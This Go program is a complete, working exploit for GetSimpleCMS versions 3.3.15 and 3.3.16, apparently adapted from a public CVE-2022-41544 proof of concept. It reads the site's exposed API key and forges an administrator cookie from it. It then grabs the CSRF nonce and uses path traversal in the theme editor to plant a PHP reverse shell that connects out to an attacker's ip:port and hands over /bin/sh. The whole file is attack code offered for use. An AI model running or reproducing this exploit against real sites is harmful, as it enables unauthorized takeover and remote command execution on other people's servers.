// This exploit implementation took heavy inspiration from
// https://github.com/yosef0x01/CVE-2022-41544/tree/main
package main

import (
	"crypto/sha1"
	"encoding/hex"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var extractVersionPattern = regexp.MustCompile(`jquery\.getsimple\.js\?v=(.*)"`)

func extractVersion(client *http.Client, target url.URL) (string, error) {
	targetURL := target.JoinPath("admin", "index.php")
	resp, err := client.Get(targetURL.String())
	if err != nil {
		return "", fmt.Errorf("error during request to `%s`: %w", targetURL, err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading response body: %w", err)
	}

	data := string(raw)
	result := extractVersionPattern.FindStringSubmatch(data)

	if len(result) != 2 {
		return "", fmt.Errorf("error cannot find version, wanted 1 part got, %d", len(result))
	}

	return result[1], nil
}

func extractApiKey(client *http.Client, target url.URL) (string, error) {
	targetURL := target.JoinPath("data", "other", "authorization.xml")

	resp, err := client.Get(targetURL.String())
	if err != nil {
		return "", fmt.Errorf("error during request to `%s`: %w", targetURL.String(), err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading response body: %w", err)
	}

	var authData struct {
		ApiKey string `xml:"apikey"`
	}

	if err := xml.Unmarshal(raw, &authData); err != nil {
		return "", fmt.Errorf("error parsing xml response: %w", err)
	}

	return authData.ApiKey, nil
}

func buildCookieString(username string, version string, apikey string) string {
	preppedVersion := strings.ReplaceAll(version, ".", "")
	rawCookieName := sha1.Sum(fmt.Append(nil, "getsimple_cookie_", preppedVersion, apikey))
	cookieName := hex.EncodeToString(rawCookieName[:])

	rawCookieValue := sha1.Sum(fmt.Append(nil, username, apikey))
	cookieValue := hex.EncodeToString(rawCookieValue[:])

	return fmt.Sprintf("GS_ADMIN_USERNAME=%s;%s=%s", username, cookieName, cookieValue)
}

var csrfTokenPattern = regexp.MustCompile(`nonce" type="hidden" value="([^"]*)"`)

func extractCSRFToken(client *http.Client, target url.URL, cookie string) (string, error) {
	targetURL := target.JoinPath("admin", "theme-edit.php")

	req, err := http.NewRequest(http.MethodGet, targetURL.String(), nil)
	if err != nil {
		return "", fmt.Errorf("error constructing request: %w", err)
	}
	req.Header.Add("Cookie", cookie)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error during request to `%s`: %w", targetURL, err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading body: %w", err)
	}

	result := csrfTokenPattern.FindStringSubmatch(string(raw))
	if len(result) != 2 {
		return "", fmt.Errorf("error cannot find version, wanted 1 part got, %d", len(result))
	}

	return result[1], nil
}

func uploadShell(client *http.Client, target url.URL, cookie string, nonce string, payload string) error {
	values := url.Values{}
	values.Set("content", payload)
	values.Set("edited_file", "../shell.php")
	values.Set("nonce", nonce)
	values.Set("submitsave", "1")

	targetURL := target.JoinPath("admin", "theme-edit.php")
	targetURL.RawQuery = url.Values{"updated": []string{"true"}}.Encode()

	req, err := http.NewRequest(http.MethodPost, targetURL.String(), strings.NewReader(values.Encode()))
	if err != nil {
		return fmt.Errorf("error constructing request: %w", err)
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Cookie", cookie)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error during request to `%s`: %w", targetURL, err)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("shell upload failed... status: %s", resp.Status)
	}

	return nil
}

func triggerShell(client *http.Client, target url.URL) error {
	targetURL := target.JoinPath("shell.php")

	resp, err := http.Get(targetURL.String())
	if err != nil {
		return fmt.Errorf("error during request to `%s`: %w", targetURL, err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("error: status `%s` != 200", resp.Status)
	}

	return nil
}

const shellCode = `<?php
    $ip = '%s';
    $port = %s;
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);`

func run() error {
	var base string
	var path string
	var reverseShellTarget string
	var username string

	flag.StringVar(&base, "target", "", "address of the target")
	flag.StringVar(&path, "path", "/", "path where GetSimpleCMS is reachable")
	flag.StringVar(&reverseShellTarget, "reverse-shell-target", "", "address:port where the reverse shell is listening")
	flag.StringVar(&username, "username", "admin", "username the API key is for")

	flag.Parse()

	reverseTargetParts := strings.Split(reverseShellTarget, ":")
	if len(reverseTargetParts) != 2 {
		return fmt.Errorf("invalid value for `--reverse-shell-target`: expected format <ip>:<port>, but got %s", reverseShellTarget)
	}

	target, err := url.Parse(fmt.Sprintf("http://%s", base))
	if err != nil {
		return fmt.Errorf("invalid base or path: base `%s` path `%s`: %w", base, path, err)
	}
	target.JoinPath(path)

	httpClient := http.DefaultClient

	version, err := extractVersion(httpClient, *target)
	if err != nil {
		return fmt.Errorf("error while extracting version: %w", err)
	}

	if version != "3.3.16" && version != "3.3.15" {
		return fmt.Errorf("error version `%s` is not vulnerable", version)
	}

	apiKey, err := extractApiKey(httpClient, *target)
	if err != nil {
		return fmt.Errorf("error while extracting api key: %w", err)
	}

	cookie := buildCookieString(username, version, apiKey)
	nonce, err := extractCSRFToken(httpClient, *target, cookie)
	if err != nil {
		return fmt.Errorf("error while extractng csrf token: %w", err)
	}

	payload := fmt.Sprintf(shellCode, reverseTargetParts[0], reverseTargetParts[1])

	if err := uploadShell(httpClient, *target, cookie, nonce, payload); err != nil {
		return fmt.Errorf("shell code upload failed: %w", err)
	}

	if err := triggerShell(httpClient, *target); err != nil {
		return fmt.Errorf("error triggering shell: %w", err)
	}

	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Println("run failed:", err)
		os.Exit(1)
	}
}
